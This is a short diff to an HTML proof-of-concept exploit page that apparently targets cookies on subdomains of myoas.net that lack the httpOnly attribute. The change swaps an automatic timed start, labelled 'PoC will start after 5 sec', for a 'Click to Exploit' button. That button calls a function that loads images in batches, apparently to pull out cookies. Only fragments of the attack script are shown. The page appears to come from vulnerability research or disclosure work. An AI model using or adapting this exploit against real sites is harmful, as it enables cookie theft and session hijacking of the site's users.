@@ -14,7 +14,9 @@
   Note: We can also retrieve cookies on any subdomain of `myoas.net` that have no httpOnly attribute set and with the
   `.myoas.net` domain attribute.
 
-  <h4> PoC will start after 5 sec</h4>
+  <br><br>
+  <button onclick=run()> Click to Exploit</button>
+  <br><br>
   <script>
     // Function to generate a random string of length 10
     function generateRandomString() {
@@ -81,9 +83,9 @@
     }
 
     // Start loading images in batches
-    setTimeout(() => {
+    function run() {
       loadBatch(0);
-    }, 3000)
+    }
   </script>
 </body>
 
